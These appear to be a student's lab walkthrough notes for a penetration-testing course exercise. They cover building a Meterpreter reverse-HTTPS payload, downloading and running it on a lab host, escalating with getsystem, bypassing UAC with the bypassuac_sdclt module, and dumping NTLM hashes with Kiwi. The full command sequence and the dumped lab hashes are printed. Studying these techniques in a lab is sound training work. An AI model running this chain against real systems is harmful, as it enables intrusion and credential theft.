Questions
Follow the steps from this section and use Kiwi to retrieve the NTLM hash of user offsec. Enter it as answer to this question.

# Create payload using msfvenom
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe

# Access to msfconsole
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
set LHOST tun0
run -j

# start the http server for payload transferring
python3 -m http.server 80

# access to the victim server
nc 192.168.195.223 4444
# open powershell
powershell
iwr -uri http://192.168.45.214/met.exe -Outfile met.exe
.\met.exe

# back to metasploit
sessions -i 1 --timeout 60

meterpreter > getuid
Server username: ITWK01\luiza
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > ps
...
5476  5400  OneDrive.exe
...
meterpreter > migrate 5476
[*] Migrating from 4388 to 5476...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ITWK01\offsec
meterpreter > shell
C:\Windows\system32>powershell -ep bypass

# We are now running in the context of offsec again. While this is an administrative account, UAC prevents us from performing administrative operations as we learned in previous Modules. Before we attempt to bypass UAC, let's confirm that the current process has the integrity level Medium.

# To display the integrity level of a process, we can use tools such as Process Explorer2 or third-party PowerShell modules such as NtObjectManager.3 Let's assume the latter is already installed on the system.

PS C:\Windows\system32> Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Medium

# We can make the sessions run in the background
PS C:\Windows\system32> CTRL + Z
Background channel 1? [y/N]  y
meterpreter > bg
[*] Backgrounding session 3...

msf6 exploit(multi/handler) > search UAC

# We can use UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe. This binary can be abused to bypass UAC by spawning a process with integrity level High

msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt 
msf6 exploit(windows/local/bypassuac_sdclt) > show options
...
Module options (exploit/windows/local/bypassuac_sdclt):
SESSION                        yes       The session to run this module on
Payload options (windows/x64/meterpreter/reverse_tcp):
LHOST     192.168.1.196    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

# Configure the payload target to our session 3
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 3
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.45.214
msf6 exploit(windows/local/bypassuac_sdclt) > run

meterpreter > shell
C:\Windows\system32>powershell -ep bypass
PS C:\Windows\system32> Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
High

# Now we had obtain a high privilege token and therefore we hae successfully bypassed UAC

# Besides being able to background an active session and execute modules through it, we can also load extensions directly inside the active session with the load command.

# One great example of this is Kiwi, which is a Meterpreter extension providing the capabilities of Mimikatz. Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session, start the listener again, execute met.exe as user luiza in the bind shell, and enter getsystem.

# Exit from previous sessions and change the payload to use multi/handler
msf6 exploit(windows/local/bypassuac_sdclt) > use multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > run

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > load kiwi

# Then, we can use help to display the commands of the Kiwi module. Finally, we'll use creds_msv to retrieve LM7 and NTLM8 credentials.

meterpreter > creds_msv
...
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd80bbd
...








